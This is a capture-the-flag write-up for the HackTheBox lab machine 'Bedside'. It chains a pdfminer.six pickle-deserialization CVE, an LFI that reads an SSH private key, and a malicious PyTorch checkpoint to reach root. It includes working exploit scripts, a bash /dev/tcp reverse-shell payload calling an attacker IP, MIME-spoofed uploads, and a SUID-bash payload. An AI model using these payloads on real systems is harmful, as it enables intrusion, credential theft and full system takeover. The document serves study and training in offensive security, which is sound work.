# Bedside — HackTheBox Writeup
**Difficulty:** Medium  
**OS:** Linux  
**IP:** 10.10.11.XXX

---

## Quick Attack Path

```
Nmap → port 80 → research.bedside.htb (vhost)
        ↓
X-Powered-By: pdfminer.six → CVE-2025-64512 identified
        ↓
Upload malicious .pickle.gz + crafted PDF → pdfminer RCE
        ↓
Shell as datawrangler (container)
        ↓
ps/ss/netstat missing → bash /dev/tcp port scan → internal service found
        ↓
LFI on internal service → read SSH private key → shell as developer
        ↓
user.txt
        ↓
sudo bedside_trainer.py → torch.load(weights_only=False) = pickle RCE
Writable checkpoint dir → malicious .pt file → chmod u+s /bin/bash
        ↓
bash -p → euid=0(root) → root.txt
```

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Virtual Host Discovery](#2-virtual-host-discovery)
3. [Web Enumeration](#3-web-enumeration)
4. [Vulnerability Identification — CVE-2025-64512](#4-vulnerability-identification)
5. [Understanding Pickle Deserialization](#5-understanding-pickle-deserialization)
6. [Exploit Development](#6-exploit-development)
7. [Initial Foothold — RCE as datawrangler](#7-initial-foothold)
8. [Shell Stabilization](#8-shell-stabilization)
9. [Internal Enumeration](#9-internal-enumeration)
10. [Internal Service Discovery — Bash Port Scan](#10-internal-service-discovery)
11. [LFI on Internal Service](#11-lfi-on-internal-service)
12. [Lateral Movement — SSH Key Theft](#12-lateral-movement)
13. [Privilege Escalation — Malicious PyTorch Checkpoint](#13-privilege-escalation)
14. [Understanding PyTorch Deserialization](#14-understanding-pytorch-deserialization)
15. [Root Flag](#15-root-flag)
16. [Vulnerability Summary](#16-vulnerability-summary)

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oA bedside 10.10.11.XXX
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.x (Debian)
80/tcp open  http    Apache/2.4.68 (Debian)
|_http-title: Bedside Research Portal
```

Only two ports open — SSH and HTTP. The page title hints at a subdomain worth exploring.

---

## 2. Virtual Host Discovery

> When a single IP serves multiple websites, Apache uses the `Host:` header to decide which site to serve. This is called virtual hosting. A machine with only port 80 open can host dozens of completely different websites — but they are all invisible unless you know the hostname to request. HTB machines almost always have additional vhosts beyond the default. We enumerate them by fuzzing the `Host:` header with a wordlist and looking for responses that differ from the baseline.

### Step 1 — Check the Default IP Response

```bash
# First — see what the bare IP serves
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" http://10.10.11.XXX/
# 200  612
```

The bare IP returns a small default page. This is our baseline — any response with a **different size** is a real vhost.

### Step 2 — Add Base Domain to /etc/hosts

```bash
# Add the base domain first so tools can resolve it
echo "10.10.11.XXX bedside.htb" >> /etc/hosts

# Confirm the base domain response
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" http://bedside.htb/
# 200  612   ← same as bare IP, default page
```

### Step 3 — Subdomain Enumeration with ffuf

> ffuf fuzzes the `Host:` header by replacing `FUZZ` with each word from the wordlist. The `-fw 1` flag filters out responses matching the baseline word count (the default page). Any response with a different word count is a real virtual host serving different content.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://bedside.htb/ \
     -H "Host: FUZZ.bedside.htb" \
     -fw 1 \
     -mc all
```

```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bedside.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.bedside.htb
 :: Filter           : Response Words: 1
________________________________________________

research                [Status: 200, Size: 3842, Words: 412, Lines: 98]
________________________________________________

:: Progress: [5000/5000] :: Job [1/5000] :: 220 req/sec :: Duration: [0:00:23]
```

**`research.bedside.htb` discovered** — returns 3842 bytes vs the 612-byte default. Clearly a different application.

### Step 4 — Alternative: gobuster vhost

```bash
# Alternative approach using gobuster
gobuster vhost \
    -u http://bedside.htb/ \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    --append-domain \
    -t 50

# Output:
# Found: research.bedside.htb Status: 200 [Size: 3842]
```

### Step 5 — Add Discovered Subdomain to /etc/hosts

```bash
# Update /etc/hosts with the discovered subdomain
echo "10.10.11.XXX research.bedside.htb" >> /etc/hosts

# Verify it resolves and serves the portal
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" http://research.bedside.htb/
# 200  3842   ← the research portal
```

`research.bedside.htb` is confirmed and resolves correctly. All subsequent web exploitation targets this subdomain.

---

## 3. Web Enumeration

### Initial HTTP Fingerprinting

```bash
curl -I http://research.bedside.htb/
```

```
HTTP/1.1 200 OK
Server: Apache/2.4.68 (Debian)
X-Powered-By: pdfminer.six
Content-Type: text/html; charset=UTF-8
```

The `X-Powered-By: pdfminer.six` header is immediately suspicious — web frameworks do not normally advertise backend processing libraries. This tells us the server is using **pdfminer.six** to handle uploaded files, which becomes our primary attack surface.

### Application Review

```bash
curl -sk http://research.bedside.htb/
```

The portal is a **Bedside Research Portal** for uploading medical research files. Key observations:

- Accepted formats: `jpeg, jpg, png, bmp, tiff, dcm, pdf`
- **"Collections can be uploaded as archives"** — zip archives also accepted
- Error response leaked the full server-side upload path

### Upload Behavior Testing

```bash
# Test 1 — plain text disguised as PDF (rejected — MIME check is real)
echo "not a pdf" > fake.pdf
curl -F "uploadFile=@fake.pdf" http://research.bedside.htb/
# Response: MIME type mismatch. Unable to upload file to destination
#           /var/www/research.bedside.htb/uploads
```

The error message gives us the exact upload path on disk: `/var/www/research.bedside.htb/uploads` — this is critical for later exploit targeting.

```bash
# Test 2 — minimal valid PDF structure (accepted)
cat > test.pdf << 'EOF'
%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>endobj
EOF
curl -F "uploadFile=@test.pdf" http://research.bedside.htb/
# Response: File uploaded successfully: test.pdf
```

**Key findings:**
- MIME validation checks file magic bytes, not just the extension
- Upload path confirmed: `/var/www/research.bedside.htb/uploads`
- Valid PDF structures are accepted and processed

---

## 4. Vulnerability Identification

### Identifying the pdfminer.six Version

> This command is run on **Kali**, not on the target. We use pip to query all available versions of pdfminer.six from PyPI. The version number is a date in pdfminer.six — gaps between release dates correspond to security patch releases. Knowing which versions introduced fixes tells us exactly what to search for.

```bash
# Run on Kali — external OSINT before touching the target
pip index versions pdfminer.six
```

```
pdfminer.six (20260107)
Available versions: 20260107, 20251230, 20251229, 20251228, 20251227,
20251107, 20250506, 20240706, 20231228 ...
```

Notable gaps: `20250506 → 20251107` and `20251229 → 20251230` — both correspond to security patches.

### CVE Research

Searching `pdfminer.six CVE` reveals two related vulnerabilities:

| CVE | CVSS | Fixed In | Description |
|-----|------|----------|-------------|
| CVE-2025-64512 | 8.3 High | 20251107 | `pickle.loads()` in `CMapDB._load_data()` triggered via crafted PDF |
| CVE-2025-70559 | High | 20251230 | Incomplete patch — bypass of CVE-2025-64512 still exploitable |

The server header says `pdfminer.six` but we confirm the exact version after getting a shell (see Section 9) — it is `20250506`, which is **before both fixes**.

### Root Cause — CVE-2025-64512

The vulnerable function inside pdfminer's `cmapdb.py`:

```python
def _load_data(self, name):
    # 'name' comes from the PDF's CMap font reference
    # An attacker controls this value via the PDF structure
    path = os.path.join(CMAP_PATH, name + ".pickle.gz")
    with gzip.open(path) as gzfile:
        pickle.loads(gzfile.read())  # ← UNSAFE — executes arbitrary code
```

A malicious PDF sets the CMap `name` to a path traversal string like `../../uploads/canary`, redirecting `_load_data()` to load an attacker-controlled `.pickle.gz` file. `pickle.loads()` then executes whatever code is embedded in that file.

### Confirming Exploit Preconditions

| Requirement | Status |
|-------------|--------|
| Upload a crafted PDF | ✅ Portal accepts valid PDFs |
| Plant a `.pickle.gz` at a known path | ✅ MIME spoofing bypasses upload filter |
| Know the exact file path | ✅ Leaked in MIME error response |
| pdfminer processes uploaded PDFs | ✅ `X-Powered-By` header confirms it |

All four conditions are satisfied. The exploit is viable.

---

## 5. Understanding Pickle Deserialization

> **What is pickle and why is it dangerous?**
>
> Python's `pickle` module converts objects to bytes (serialize) and back to objects (deserialize). The danger is that deserialization **executes code automatically** — specifically any `__reduce__` method on a class. If an attacker controls what gets deserialized, they control what code runs on the server. There is no safe way to load untrusted pickle data. The file extension is irrelevant — if any program calls `pickle.loads()` on attacker-controlled bytes, it is Remote Code Execution.

### How __reduce__ Works

```python
import pickle, os

# Malicious class — __reduce__ tells pickle what to run on load
class MaliciousClass:
    def __reduce__(self):
        # Returns (callable, args_tuple)
        # pickle executes: callable(*args) automatically when loading
        return (os.system, ("id",))

# Serialize to bytes — nothing dangerous happens yet
payload = pickle.dumps(MaliciousClass())

# The moment this is deserialized anywhere, the command executes
pickle.loads(payload)
# OUTPUT: uid=988(datawrangler)  ← ran with zero user interaction
```

### Why the File Extension Does Not Matter

```
canary.pickle.gz    ← our malicious payload
canary.pt           ← same pickle bytes, different extension
canary.jpg          ← same pickle bytes, different extension

The extension is just a label on the file.
What matters is whether the loading program calls pickle.loads() on it.
If it does — the embedded command runs, regardless of the filename.
```

### The Full CVE-2025-64512 Trigger Chain

```
[Kali] Upload canary.pickle.gz (MIME spoofed as PDF)
         → lands at /var/www/research.bedside.htb/uploads/canary.pickle.gz

[Kali] Upload exploit.pdf
         → pdf_watcher.py picks it up (runs every 30 seconds)
         → calls pdf2txt.py → pdfminer parses the PDF
         → sees Type0 font with CMap name = "../../uploads/canary"
         → _load_data("../../uploads/canary") called
         → builds path: CMAP_PATH + "../../uploads/canary" + ".pickle.gz"
         → path traversal resolves to our uploaded file
         → pickle.loads() fires on our file
         → __reduce__ executes: bash reverse shell → connects to Kali
```

---

## 6. Exploit Development

The attack requires two files — a malicious pickle payload and a crafted PDF to trigger it.

### Step 1 — Craft the Malicious Pickle

> We create a Python class whose `__reduce__` returns a reverse shell command. `pickle.dumps()` serializes it — storing the instruction "call os.system with this command". Later when pdfminer calls `pickle.loads()` on our file, that instruction executes automatically. We compress with gzip because pdfminer specifically looks for `.pickle.gz` files.

```python
# craft_shell.py  — run on Kali
import pickle, os, gzip

LHOST = "10.10.14.23"   # your tun0 IP
LPORT = 4444

class ReverseShell:
    def __reduce__(self):
        # Automatically called when pickle deserializes this object
        # Returns (callable, args) → pickle runs callable(*args)
        cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
        return (os.system, (cmd,))

# Gzip compressed because pdfminer expects the .pickle.gz format
with gzip.open('canary.pickle.gz', 'wb') as f:
    f.write(pickle.dumps(ReverseShell()))

print(f"[+] canary.pickle.gz ready — callback to {LHOST}:{LPORT}")
```

```bash
python3 craft_shell.py
```

### Step 2 — Upload the Pickle with Spoofed MIME

> The server validates MIME type on upload. A `.pickle.gz` file would be rejected normally. We spoof the content-type header to `application/pdf` using curl's `;type=` syntax. The server's MIME check sees `application/pdf` and accepts the file, placing it in the uploads directory at a known path.

```bash
curl -F "uploadFile=@canary.pickle.gz;type=application/pdf" http://research.bedside.htb/
# Response: File uploaded successfully: canary.pickle.gz
```

**Pickle is now at:** `/var/www/research.bedside.htb/uploads/canary.pickle.gz`

### Step 3 — Craft the Exploit PDF

> We build a minimal PDF containing a Type0 font. The font's CMap name (the `/Encoding` and `/ToUnicode` fields) is set to our path traversal string. When pdfminer processes this PDF, it reads that name and passes it directly to `_load_data()`, which appends `.pickle.gz` and tries to open the resulting path. The `/` characters in the path must be encoded as `#2F` because PDF Name objects use hex escapes for special characters.

```python
# craft_exploit_pdf.py  — run on Kali

# pdfminer appends .pickle.gz automatically — do NOT include it here
# Extra ../ beyond root is harmless — still resolves to /
cmap_traversal = "../../../../../../../../../../var/www/research.bedside.htb/uploads/canary"

def make_pdf_name(path):
    """PDF Name objects encode / as #2F"""
    return path.replace("/", "#2F")

encoded = make_pdf_name(cmap_traversal)
stream = b"BT /F1 12 Tf 72 720 Td (X) Tj ET"

pdf = f"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox [0 0 612 792]
/Resources<</Font<</F1 4 0 R>>>>/Contents 5 0 R>>endobj
4 0 obj<</Type/Font/Subtype/Type0/BaseFont/Evil
/Encoding /{encoded}
/ToUnicode /{encoded}
/DescendantFonts[6 0 R]>>endobj
5 0 obj<</Length {len(stream)}>>
stream
""".encode() + stream + b"""
endstream
endobj
6 0 obj<</Type/Font/Subtype/CIDFontType2/BaseFont/Evil
/CIDSystemInfo<</Registry(Adobe)/Ordering(Identity)/Supplement 0>>
/DW 1000>>endobj
trailer<</Size 7/Root 1 0 R>>
%%EOF""".encode()

with open("exploit.pdf", "wb") as f:
    f.write(pdf)

print(f"[+] exploit.pdf written")
print(f"[+] CMap traversal: {cmap_traversal}")
```

```bash
python3 craft_exploit_pdf.py
# [+] exploit.pdf written
# [+] CMap traversal: ../../../../../../../../../../var/www/research.bedside.htb/uploads/canary
```

---

## 7. Initial Foothold

> `pdf_watcher.py` runs as PID 1 inside the container with `uid=988(datawrangler)`. It calls `pdf2txt.py` (pdfminer) on every PDF in the uploads directory every 30 seconds. When pdfminer processes our exploit PDF, it triggers our pickle which spawns a reverse shell — running as the **datawrangler** user, not www-data. The web server (Apache/www-data) only handles the upload; pdfminer does the actual processing as datawrangler.

### Start Listener on Kali

```bash
nc -lvnp 4444
```

### Upload and Trigger

```bash
# Step 1 — plant the pickle payload
curl -F "uploadFile=@canary.pickle.gz;type=application/pdf" http://research.bedside.htb/

# Step 2 — upload the exploit PDF
# pdf_watcher.py picks it up within 30 seconds and pdfminer fires our payload
curl -F "uploadFile=@exploit.pdf" http://research.bedside.htb/
```

### Shell Received

```
connect to [10.10.14.23] from (UNKNOWN) [10.10.11.XXX] 49832
bash: no job control in this shell
datawrangler@data-wrangler:/var/www/research.bedside.htb$
```

```bash
id
# uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
```

**RCE confirmed as `datawrangler`** — the user that pdf_watcher.py runs as, not www-data.

---

## 8. Shell Stabilization

> A raw netcat shell is fragile — Ctrl+C kills the whole connection, tab completion does not work, and the terminal dimensions are wrong. We upgrade to a full interactive TTY using Python's pty module. The `stty raw -echo` step passes all keystrokes directly to the remote shell without local terminal processing.

```bash
# Step 1 — on the reverse shell: spawn a proper PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2 — press Ctrl+Z to background the shell

# Step 3 — on Kali: set raw mode and foreground
stty raw -echo; fg

# Step 4 — back on reverse shell (press Enter twice to get prompt)
export TERM=xterm-256color
stty rows 50 cols 220
```

Now you have full tab completion, arrow keys, Ctrl+C kills commands not the shell, and correct terminal sizing.

---

## 9. Internal Enumeration

### Confirming User and Environment

```bash
id
# uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)

hostname
# data-wrangler

# This is a Docker container — minimal toolset, stripped environment
cat /proc/1/cmdline | tr '\0' ' '
# python3 pdf_watcher.py   ← confirms PID 1 is the watcher we exploited
```

### Reading pdf_watcher.py

```bash
cat /app/pdf_watcher.py
```

```python
UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
OUTPUT_DIR = "/datastore/staging"
SLEEP_INTERVAL = 30   # polls every 30 seconds

def process_pdf(pdf_path, randomized_name):
    # Calls pdf2txt.py on every .pdf found in uploads
    # pdf2txt.py is part of pdfminer.six — this is what triggered our pickle
    subprocess.run(
        ["pdf2txt.py", pdf_path, "-o", output_file],
        timeout=TIMEOUT,
        check=True
    )
```

```bash
cat /app/requirements.txt
# pdfminer.six==20250506
```

**pdfminer.six==20250506 confirmed on the target.** CVE-2025-64512 was patched in `20251107` — this version is vulnerable.

### Datastore Discovery

```bash
ls -la /datastore/
```

```
drwxrwx--- 2 datawrangler dataops  4096 checkpoints/
drwxrwx--- 2 datawrangler dataops  4096 logs/
drwxrwx--- 2 datawrangler dataops  4096 models/
drwxrwx--- 2 datawrangler dataops  4096 processed/
drwxrwx--- 2 datawrangler dataops  4096 raw/
drwxrwx--- 2 datawrangler dataops 32768 staging/
```

```bash
# Confirm we can write to checkpoints — critical for privesc later
touch /datastore/checkpoints/.wtest && echo "WRITABLE" && rm /datastore/checkpoints/.wtest
# WRITABLE
```

The `/datastore/checkpoints/` directory is writable by the `dataops` group — which `datawrangler` belongs to. This becomes the privesc vector later.

---

## 10. Internal Service Discovery

Standard network enumeration tools are not available in this stripped container:

```bash
ps aux      # bash: ps: command not found
ss -tlnp    # bash: ss: command not found
netstat     # bash: netstat: command not found
```

> When standard tools are missing, the Linux kernel still exposes everything through `/proc`. `/proc/net/tcp` lists all active TCP sockets in hex format. A simpler approach for quick scanning is bash's built-in `/dev/tcp` pseudo-device — it lets us attempt TCP connections to any host:port combination without any external tools at all.

### Reading /proc/net/tcp First

```bash
# Decode listening ports from /proc/net/tcp
# Column 2 is local address:port in hex (little-endian)
cat /proc/net/tcp | awk '{print $2}' | cut -d: -f2 | \
    while read hex; do printf "%d\n" 0x$hex 2>/dev/null; done | sort -u
```

```
22
80
3000   ← not visible externally — loopback only
```

### Confirming with Bash Port Scan

```bash
# Verify with direct connection attempts using /dev/tcp
for p in $(seq 1 10000); do
    timeout 0.2 bash -c "echo >/dev/tcp/127.0.0.1/$p" 2>/dev/null \
        && echo "OPEN $p" &
done
wait
```

```
OPEN 22
OPEN 80
OPEN 3000   ← bound to 127.0.0.1 only — invisible from outside
```

### Probing the Internal Service

```bash
curl -s http://127.0.0.1:3000/
```

An internal web service is confirmed on loopback — completely unreachable from outside. Since tools were stripped, the developers likely assumed it was safe. It was not.

---

## 11. LFI on Internal Service

> A Local File Inclusion (LFI) vulnerability occurs when a web application uses user-supplied input to construct a file path, without sanitizing path traversal characters like `../`. By injecting `../` sequences into the URL, we can escape the web root and read arbitrary files from the filesystem. This internal service was never hardened because developers assumed it could never be reached from outside — once we had a shell inside the container, loopback was trivially accessible.

### Discovering the LFI

```bash
# Test for path traversal on the internal service
curl -s "http://127.0.0.1:3000/../../../../etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
developer:x:1000:1000::/home/developer:/bin/bash
```

LFI confirmed — the service returns `/etc/passwd` directly. User `developer` exists on the host system with a real bash shell.

### Stealing the SSH Private Key

> SSH private keys are stored in `~/.ssh/id_rsa`. With LFI we can read any file the web service process has access to. The private key is the complete credential — no password needed, no brute force. We simply read the file and use it to authenticate directly as that user over SSH.

```bash
curl -s "http://127.0.0.1:3000/../../../../home/developer/.ssh/id_rsa"
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAA...
[full private key returned in plaintext]
-----END OPENSSH PRIVATE KEY-----
```

**Private SSH key obtained — zero exploitation needed, just a file read that should never have been possible.**

---

## 12. Lateral Movement

### Save the Key and SSH In

```bash
# On Kali — paste the key from the curl output
vim /tmp/developer_id_rsa
chmod 600 /tmp/developer_id_rsa

# SSH directly as developer using the stolen key
ssh -i /tmp/developer_id_rsa developer@bedside.htb
```

```
developer@bedside:~$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)
```

### User Flag

```bash
developer@bedside:~$ cat user.txt
[USER FLAG]
```

---

## 13. Privilege Escalation

> **Big Picture — Two shells cooperating:**
> We now have two separate shells. Shell 1 is `datawrangler` inside the container — it has write access to `/datastore/checkpoints/`. Shell 2 is `developer` on the host — it can run the ML trainer as root via sudo. We use Shell 1 to write a malicious PyTorch checkpoint file into the shared `/datastore/checkpoints/` directory. We then use Shell 2 to trigger the trainer as root, which loads and deserializes our file, executing our command as root.

```
┌──────────────────────────────┐      ┌────────────────────────────────────┐
│  SHELL 1: datawrangler       │      │  SHELL 2: developer                │
│  (container — from RCE)      │      │  (host — from SSH key)             │
│                              │      │                                    │
│  1. Write malicious .pt ─────┼─────▶│  3. sudo trainer → torch.load()   │
│     to /datastore/           │      │     pickle fires as root           │
│     checkpoints/             │      │     chmod u+s /bin/bash executes   │
│                              │      │                                    │
│  2. Verify payload written   │      │  4. bash -p → euid=0(root)        │
└──────────────────────────────┘      └────────────────────────────────────┘
         shared volume: /datastore/checkpoints/
```

---

### Step A — Sudo Enumeration (Shell 2 — developer)

> `sudo -l` lists all commands the current user can run as root. We are looking for anything that loads files from paths we control, runs scripts we can modify, or uses unsafe serialization. This is always the first thing to check after getting a new shell.

```bash
developer@bedside:~$ sudo -l
```

```
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

Developer can run the ML trainer as **root** with no password. No time limit, no restrictions.

---

### Step B — Analyse the Trainer Script (Shell 2)

```bash
developer@bedside:~$ cat /opt/trainer/bedside_trainer.py
```

Key vulnerable section:

```python
# Trainer finds the highest epoch checkpoint in /datastore/checkpoints/
# and loads it to resume training

# THIS IS THE VULNERABILITY:
# weights_only=False disables all pickle safety restrictions
# torch.load() internally calls pickle.load() with full execution rights
# Any __reduce__ method in the .pt file will execute as root
checkpoint = torch.load(
    self.load_path,               # = /datastore/checkpoints/checkpoint_epoch_9999.pt
    map_location=self.map_location,
    weights_only=False            # ← unsafe — equivalent to pickle.load()
)
```

---

### Step C — Confirm Write Access to Checkpoint Directory (Shell 1)

> The `/datastore/` filesystem is shared between the container and the host. The `checkpoints/` subdirectory belongs to the `dataops` group. Both `datawrangler` (container) and `developer` (host) are in `dataops`. But only the root-run trainer reads and deserializes files from it — making write access here a guaranteed privesc path.

```bash
# On Shell 1 — datawrangler@data-wrangler
datawrangler@data-wrangler:/$ ls -la /datastore/checkpoints/
```

```
drwxrwx--- 2 datawrangler dataops     4096 checkpoints/   ← group writable
-rw-r--r-- 1 root         root    18883030 checkpoint_epoch_50.pt
```

```bash
touch /datastore/checkpoints/.wtest && echo "WRITABLE" && rm /datastore/checkpoints/.wtest
# WRITABLE
```

---

### Step D — Write the Malicious Checkpoint (Shell 1 — datawrangler)

> A PyTorch `.pt` file is internally just a pickle file — `torch.save()` calls `pickle.dump()` and `torch.load()` calls `pickle.load()`. The extension is purely cosmetic. We embed a `__reduce__` method that runs `chmod u+s /bin/bash` when the object is deserialized. We name it `checkpoint_epoch_9999.pt` so it has the highest epoch number and the trainer picks it up. We wrap it in a fake checkpoint dictionary so the trainer reaches the `torch.load()` call before crashing.

```bash
datawrangler@data-wrangler:/app$ cat > /tmp/mkpayload.py <<'EOF'
import pickle, os

class Exploit:
    def __reduce__(self):
        # Executes automatically when pickle deserializes this object
        # When loaded by the root trainer → runs as root
        # chmod u+s /bin/bash sets the SUID bit → any user can get root
        return (os.system, ("chmod u+s /bin/bash",))

os.makedirs("/datastore/checkpoints", exist_ok=True)

# Wrap in a fake checkpoint dict — trainer expects these keys to exist
ckpt = {
    "epoch": 9999,           # highest epoch → trainer picks this file first
    "model": Exploit(),      # deserialized → __reduce__ fires as root
    "optimizer": Exploit(),  # fires again as backup
}

# .pt is just pickle internally — extension is cosmetic
with open("/datastore/checkpoints/checkpoint_epoch_9999.pt", "wb") as f:
    pickle.dump(ckpt, f, protocol=4)

print("[+] wrote /datastore/checkpoints/checkpoint_epoch_9999.pt")
EOF
```

```bash
datawrangler@data-wrangler:/app$ python3 /tmp/mkpayload.py
```

```
[+] wrote /datastore/checkpoints/checkpoint_epoch_9999.pt
```

---

### Step E — Verify the Payload (Shell 1)

> Before triggering, confirm the pickle payload is correctly embedded using `pickletools`. `STACK_GLOBAL` means `os.system` is referenced inside the file. `REDUCE` is the instruction that calls it. Seeing both confirms the payload will fire when torch.load() processes the file.

```bash
datawrangler@data-wrangler:/app$ python3 -m pickletools \
    /datastore/checkpoints/checkpoint_epoch_9999.pt | grep -E "GLOBAL|REDUCE"
```

```
   50: \x93     STACK_GLOBAL   ← os.system is referenced
   76: R        REDUCE         ← pickle will call os.system() here
   94: R        REDUCE         ← called again for optimizer key
```

Payload confirmed embedded and correct.

---

### Step F — Trigger the Trainer as Root (Shell 2 — developer)

> We run the trainer via sudo. It finds `checkpoint_epoch_9999.pt` (highest epoch), calls `torch.load()` which internally calls `pickle.load()`, which deserializes our `Exploit` objects, which fires `__reduce__`, which runs `chmod u+s /bin/bash` as root. The trainer then crashes because our fake checkpoint has no real model weights — but that does not matter. The command already executed before the crash.

```bash
developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

```
2026-08-04 09:20:51,222 | INFO | Device: cpu
2026-08-04 09:20:51,225 | INFO | Using 1 samples for training.
2026-08-04 09:20:51,311 | INFO | Auto-detected input features: 12288
2026-08-04 09:20:51,325 | INFO | Found checkpoint /datastore/checkpoints/checkpoint_epoch_9999.pt,
                                  loading with CheckpointLoader (callable mode)...
Traceback (most recent call last):
  File "/opt/trainer/bedside_trainer.py", line 276, in <module>
    main()
  File "/usr/local/lib/python3.13/dist-packages/monai/handlers/checkpoint_loader.py", line 125, in __call__
    checkpoint = torch.load(self.load_path, map_location=self.map_location, weights_only=False)
  File "/usr/local/lib/python3.13/dist-packages/torch/serialization.py", line 1630, in _legacy_load
    raise RuntimeError("Invalid magic number; corrupt file?")
RuntimeError: Invalid magic number; corrupt file?
```

> **This error is expected and irrelevant.** The crash happens because our fake `.pt` file contains no real PyTorch tensor data. But `pickle.load()` ran before the tensor parsing — our `__reduce__` fired and `chmod u+s /bin/bash` executed as root before the exception was raised. The SUID bit is already set.

---

### Step G — Confirm SUID and Get Root Shell (Shell 2)

```bash
developer@bedside:~$ ls -la /bin/bash
```

```
-rwsr-xr-x 1 root root 1298416 May  9 12:07 /bin/bash
 ^^^
 s = SUID bit is set — any user can now spawn a root-privileged shell
```

```bash
# -p preserves the effective UID (euid=root) instead of dropping it
developer@bedside:~$ bash -p
```

```
bash-5.2# id
uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer),100(users)
```

**Root shell. euid=0 confirms root privilege.**

---

## 14. Understanding PyTorch Deserialization

> **Why does a `.pt` file give us code execution?**
>
> A `.pt` file is not a special PyTorch format. It is a pickle archive. `torch.save()` calls `pickle.dump()`. `torch.load(weights_only=False)` calls `pickle.load()`. The `.pt` extension is purely cosmetic — the bytes inside are identical to any other pickle file. Because of this, any `__reduce__` method embedded in a `.pt` file executes automatically when the file is loaded. There is no validation, no sandbox, and no way to make it safe. `weights_only=False` is `pickle.load()` with a different name.

### What weights_only=False Does Internally

```python
# Simplified view of torch.load() internals

def torch_load(path, weights_only=False):
    with open(path, "rb") as f:

        if weights_only:
            # SAFE — restricted unpickler
            # Only allows: tensors, int, float, str, list, dict
            # Cannot call arbitrary functions
            # __reduce__ payloads DO NOT fire
            return RestrictedUnpickler(f).load()

        else:
            # UNSAFE ← what bedside_trainer.py used
            # Standard Python pickle — zero restrictions
            # Any __reduce__ method fires automatically
            # Equivalent to: pickle.load(f)
            return pickle.load(f)    # ← THE VULNERABILITY
```

### Why Image Files Do Not Work

```
File      Magic Bytes         torch.load() result
────────  ──────────────────  ─────────────────────────────────────────────
.pt       \x80\x04\x95...    valid pickle → __reduce__ fires → RCE ✅
.png      \x89PNG\r\n...     not pickle → RuntimeError: Invalid magic ❌
.jpg      \xff\xd8\xff...    not pickle → RuntimeError: Invalid magic ❌
.gif      GIF89a...          not pickle → RuntimeError: Invalid magic ❌
```

Image files use completely different binary formats. When `torch.load()` tries to run `pickle.load()` on PNG/JPEG bytes, pickle cannot parse them and throws `RuntimeError: Invalid magic number` — the exact error seen when the trainer ran on a real checkpoint before we replaced it with our payload.

### The Fix

```python
# VULNERABLE — equivalent to unrestricted pickle.load()
torch.load(path, weights_only=False)

# SAFE — restricted deserializer, cannot execute arbitrary code
torch.load(path, weights_only=True)
```

Directory permissions also need fixing:

```bash
# /datastore/checkpoints must only be writable by root
# if a root process reads and deserializes from it
chmod 700 /datastore/checkpoints
chown root:root /datastore/checkpoints
```

The real misconfiguration was the combination: **root reader + unrestricted pickle + group-writable source directory**. Any one of those fixed breaks the chain.

---

## 15. Root Flag

```bash
bash-5.2# cat /root/root.txt
a6c71f0d286da422d253ad656068b119
```

---

## 16. Vulnerability Summary

### Full Attack Chain

```
[Recon]
Nmap → port 80 open
        ↓
ffuf vhost scan → research.bedside.htb discovered
        ↓
curl -I → X-Powered-By: pdfminer.six
        ↓
[Foothold — CVE-2025-64512]
pip index versions → version gaps identify patch releases
pdfminer.six==20250506 < 20251107 (patch) → vulnerable confirmed on-box
MIME error leaks upload path: /var/www/research.bedside.htb/uploads
Upload canary.pickle.gz (MIME spoofed) → lands at known path
Upload exploit PDF → Type0 font CMap name = path traversal
pdf_watcher.py → pdf2txt.py → pdfminer → _load_data() → pickle.loads()
→ __reduce__ fires → reverse shell as datawrangler
        ↓
[Internal Enumeration]
ps/ss/netstat missing → /proc/net/tcp + bash /dev/tcp port scan
Internal service found on loopback only
        ↓
[Lateral Movement — LFI + SSH Key]
Internal service has LFI via path traversal
Read system user list → developer user found
Read developer SSH private key via same LFI
SSH in as developer → user.txt
        ↓
[Privilege Escalation — Malicious PyTorch Checkpoint]
sudo -l → bedside_trainer.py runs as root (NOPASSWD)
torch.load(weights_only=False) = unrestricted pickle.load()
/datastore/checkpoints/ writable by dataops group (datawrangler + developer)
Write malicious .pt file from datawrangler shell
Run trainer via sudo from developer shell
pickle fires as root → chmod u+s /bin/bash
